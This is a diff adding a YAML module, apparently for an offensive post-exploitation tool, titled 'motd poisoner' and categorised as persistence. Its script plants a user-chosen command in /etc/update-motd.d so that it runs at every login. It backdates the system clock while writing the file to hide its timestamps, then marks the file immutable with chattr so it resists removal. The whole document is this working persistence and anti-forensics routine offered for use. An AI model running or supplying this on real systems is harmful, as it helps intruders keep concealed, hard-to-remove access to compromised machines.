@@ -1,0 +1,17 @@
+name: "motd poisoner"
+description: "Adds motd entry with command execution"
+category: persistence
+need_root: true
+variables:
+  - name: cmd
+    description: "Command to execute"
+priority: 1000
+tip: "Motd is poisoned with command '{{cmd}}'"
+script: |
+  NOW=$(date +@%s)
+  date -s "$(stat -c '@%Z' /etc/hostname)"
+  echo '{{cmd}}' | sudo tee /etc/update-motd.d/42-updates
+  touch /etc/update-motd.d/42-updates
+  chattr +i /etc/update-motd.d/42-updates
+  date -s "$NOW"
+  unset NOW
